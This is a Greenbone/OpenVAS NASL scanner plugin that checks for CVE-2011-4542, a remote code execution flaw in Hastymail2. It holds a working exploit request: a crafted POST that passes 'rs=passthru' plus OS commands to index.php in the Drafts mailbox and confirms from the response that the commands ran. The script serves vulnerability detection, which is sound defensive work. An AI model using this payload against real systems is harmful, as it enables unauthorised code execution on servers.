# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:hastymail:hastymail2";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902591");
  script_version("2022-04-06T08:30:48+0000");
  script_tag(name:"last_modification", value:"2022-04-06 08:30:48 +0000 (Wed, 06 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-11-25 12:12:12 +0530 (Fri, 25 Nov 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-4542");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Hastymail < 2.1.1 RC2 RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_hastymail2_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("hastymail2/http/detected");

  script_tag(name:"summary", value:"Hastymail2 is prone to a remote code execution
  vulnerability.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  via the 'rs' and 'rsargs[]' parameters to index.php (when 'page' is set to 'mailbox' and
  'mailbox' is set to 'Drafts'), which allows attackers to execute arbitrary code in the context of
  an affected site.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject
  and execute arbitrary malicious code with the privileges of the user running the application.");

  script_tag(name:"affected", value:"Hastymail2 version 2.1.1 and prior.");

  script_tag(name:"solution", value:"Update to version 2.1.1 RC2 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50791");
  script_xref(name:"URL", value:"https://www.dognaedis.com/vulns/DGS-SEC-3.html");
  script_xref(name:"URL", value:"https://www.dognaedis.com/vulns/pdf/DGS-SEC-3.pdf");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

url = dir + "/index.php?page=mailbox&mailbox=Drafts";

host = http_host_name(port:port);

foreach pattern (keys(cmds)) {
  data = "rs=passthru&rsargs[]=asd&rsargs[]=" + cmds[pattern];

  headers = make_array("Content-Type", "application/x-www-form-urlencoded");

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = 'It was possible to execute the command "' + cmds[pattern] + '".\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
